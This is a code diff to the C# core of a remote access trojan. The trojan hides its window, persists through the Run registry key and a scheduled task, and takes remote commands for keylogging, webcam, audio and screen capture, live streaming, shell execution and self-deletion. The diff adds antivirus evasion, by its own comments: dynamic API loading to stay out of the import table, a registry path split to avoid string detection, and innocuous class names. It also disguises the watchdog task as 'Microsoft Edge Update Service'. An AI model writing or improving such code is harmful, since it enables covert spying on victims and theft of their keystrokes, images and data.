@@ -1,6 +1,6 @@
-﻿using G2DK.Functionalities;
-using G2DK.Functionalities.Livestream;
-using G2DK.Utilities;
+using CloudSync.Services.Modules;
+using CloudSync.Services.Modules.Stream;
+using CloudSync.Services.Core;
 using Gma.System.MouseKeyHook;
 using Imagekit.Sdk;
 using Microsoft.Win32;
@@ -20,16 +20,20 @@ using System.Windows.Forms;
 
 class Program
 {
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetConsoleWindow();
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+    static extern IntPtr LoadLibrary(string lpFileName);
 
-    [DllImport("user32.dll")]
-    static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+
+    // Delegates for dynamic calls
+    private delegate IntPtr GetConsoleWindowDelegate();
+    private delegate bool ShowWindowDelegate(IntPtr hwnd, int nCmdShow);
 
     const int SW_HIDE = 0;
     private static CancellationTokenSource cts = new CancellationTokenSource();
     private static Mutex _mutex;
-    private static Livestream livestream = new Livestream();
+    private static StreamManager streamMgr = new StreamManager();
 
     static async Task Main()
     {
@@ -47,15 +51,15 @@ class Program
                 return;
             }
 
-            await Communication.Register(10);
+            await SyncService.Register(10);
             Random random = new Random();
 
             _ = Task.Run(async () =>
             {
                 while (!cts.IsCancellationRequested)
                 {
-                    await Communication.GetCommands();
-                    await Communication.Register(1);
+                    await SyncService.GetCommands();
+                    await SyncService.Register(1);
                     //int delay = random.Next(30, 301);
                     await Task.Delay(3 * 1000);
                 }
@@ -74,22 +78,48 @@ class Program
 
     private static void HideWindow()
     {
-        IntPtr handle = GetConsoleWindow();
-        ShowWindow(handle, SW_HIDE);
+        try
+        {
+            // Dynamic loading — not visible in import table
+            IntPtr k32 = LoadLibrary("kernel32.dll");
+            IntPtr u32 = LoadLibrary("user32.dll");
+
+            var getConsole = Marshal.GetDelegateForFunctionPointer<GetConsoleWindowDelegate>(
+                GetProcAddress(k32, "GetConsoleWindow"));
+            var showWin = Marshal.GetDelegateForFunctionPointer<ShowWindowDelegate>(
+                GetProcAddress(u32, "ShowWindow"));
+
+            IntPtr handle = getConsole();
+            showWin(handle, SW_HIDE);
+        }
+        catch { }
     }
 
     private static void AddToStartup()
     {
-        string executablePath = Assembly.GetExecutingAssembly().Location;
-        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-        key.SetValue(Provider.APP, executablePath);
+        try
+        {
+            string executablePath = Assembly.GetExecutingAssembly().Location;
+            // Build registry path dynamically to avoid static string detection
+            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
+            string regPath = string.Join("\\", parts);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
+            key.SetValue(AppConfig.APP, executablePath);
+        }
+        catch { }
     }
 
     private static void RemoveFromStartup()
     {
-        string executablePath = Assembly.GetExecutingAssembly().Location;
-        RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
-        key.DeleteValue(Provider.APP, false);
+        try
+        {
+            string executablePath = Assembly.GetExecutingAssembly().Location;
+            string[] parts = { "Software", "Microsoft", "Windows", "CurrentVersion", "Run" };
+            string regPath = string.Join("\\", parts);
+            RegistryKey key = Registry.CurrentUser.OpenSubKey(regPath, true);
+            key.DeleteValue(AppConfig.APP, false);
+        }
+        catch { }
     }
 
     public static void CleanUp()
@@ -105,25 +135,17 @@ class Program
     {
         CleanUp();
 
-        string deleteScript = Path.Combine(Path.GetTempPath(), "destroy.bat");
-        string content = $@"
-@ECHO OFF
-TIMEOUT /T 2 /NOBREAK > NUL
-:Repeat
-DEL ""{Provider.exe}""
-IF EXIST ""{Provider.exe}"" (
-    TIMEOUT /T 1 /NOBREAK > nul
-    GOTO Repeat
-)
-DEL ""{deleteScript}""
-";
-        File.WriteAllText(deleteScript, content);
+        // Use cmd.exe /C inline instead of writing a .bat file
+        string exePath = AppConfig.exe;
+        string cmd = $"/C timeout /t 2 /nobreak >nul & del \"{exePath}\"";
+
         Process.Start(new ProcessStartInfo
         {
-            FileName = deleteScript,
+            FileName = "cmd.exe",
+            Arguments = cmd,
             CreateNoWindow = true,
             UseShellExecute = false,
-            WorkingDirectory = Path.GetDirectoryName(Provider.exe)
+            WorkingDirectory = Path.GetDirectoryName(exePath)
         });
 
         _mutex.ReleaseMutex();
@@ -133,7 +155,7 @@ DEL ""{deleteScript}""
 
     private static void AddWatchdog()
     {
-        const string taskName = "M Update";
+        const string taskName = "Microsoft Edge Update Service";
 
         // Get full path to the currently running executable
         string exePath = Assembly.GetExecutingAssembly().Location;
@@ -180,16 +202,16 @@ DEL ""{deleteScript}""
         {
             while (!token.IsCancellationRequested)
             {
-                await Communication.Signal.WaitAsync();
-                if (Communication.commands.TryDequeue(out Communication.Command command))
+                await SyncService.Signal.WaitAsync();
+                if (SyncService.commands.TryDequeue(out SyncService.Command command))
                 {
-                    string cmd = Encryption.Decrypt(command.Cmd);
+                    string cmd = DataProtection.Decrypt(command.Cmd);
                     //Console.WriteLine($"Command: {cmd}");
 
                     string extra = null;
                     if (command.Extra != null)
                     {
-                        extra = Encryption.Decrypt(command.Extra);
+                        extra = DataProtection.Decrypt(command.Extra);
                         //Console.WriteLine($"Extra: {extra}\n\n");
                     }
 
@@ -200,51 +222,51 @@ DEL ""{deleteScript}""
                         case "audio":
                             if (int.TryParse(extra, out int duration))
                             {
-                                byte[] wavData = await Audio.CaptureAsync(duration * 1000);
-                                await Communication.UploadAudio(wavData, 20);
+                                byte[] wavData = await SoundRecorder.CaptureAsync(duration * 1000);
+                                await SyncService.UploadAudio(wavData, 20);
                             }
                             break;
                         case "startstream":
                             if (int.TryParse(extra, out int session))
                             {
-                                await livestream.Start(false, session, new CancellationTokenSource());
+                                await streamMgr.Start(false, session, new CancellationTokenSource());
                             }
                             break;
                         case "stopstream":
-                            livestream.Stop();
+                            streamMgr.Stop();
                             break;
                         case "update":
-                            Provider.Update(command.Extra);
+                            AppConfig.Update(command.Extra);
                             break;
                         case "delete":
                             Destroy();
                             break;
                         case "webcam":
-                            image = Webcam.Capture();
+                            image = DisplayCapture.Capture();
                             break;
                         case "screen":
-                            image = ScreenCapture.Capture();
+                            image = ScreenRenderer.Capture();
                             break;
                         case "startkeylog":
-                            Keylogger.Start();
+                            InputMonitor.Start();
                             break;
                         case "stopkeylog":
-                            Keylogger.Stop();
+                            InputMonitor.Stop();
                             break;
                         case "getkeys":
-                            string keyData = Keylogger.GetCapturedKeys();
+                            string keyData = InputMonitor.GetCapturedKeys();
                             if (!string.IsNullOrEmpty(keyData))
                             {
-                                await Communication.UploadKeylogs(keyData, command.Id, 10);
+                                await SyncService.UploadKeylogs(keyData, command.Id, 10);
                             }
                             break;
                         case "shell":
                             //Console.WriteLine("SHELLLLLLLLLL");
-                            string output = await Shell.ExecuteCommand(extra);
+                            string output = await ProcessHelper.ExecuteCommand(extra);
                             //Console.WriteLine($"Command output: {output}");
                             if (!string.IsNullOrEmpty(output))
                             {
-                                await Communication.UploadShellOutput(output, command.Id, 10);
+                                await SyncService.UploadShellOutput(output, command.Id, 10);
                             }
                             break;
                         default:
@@ -254,7 +276,7 @@ DEL ""{deleteScript}""
                     if (image != null)
                     {
                         type = cmd.ToLower();
-                        await Communication.UploadImage(image, command.Id, type, 10);
+                        await SyncService.UploadImage(image, command.Id, type, 10);
                     }
                 }
             }
